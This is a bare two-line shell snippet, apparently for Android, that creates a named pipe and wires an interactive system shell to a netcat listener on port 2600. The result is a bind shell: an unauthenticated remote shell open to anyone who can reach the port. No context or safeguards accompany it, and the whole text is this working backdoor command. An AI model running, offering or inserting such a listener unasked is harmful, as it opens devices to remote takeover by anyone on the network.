mkfifo /data/android_ubuntu
cat /data/android_ubuntu | /system/xbin/sh -i 2>&1 | nc -lk 2600 > /data/android_ubuntu  &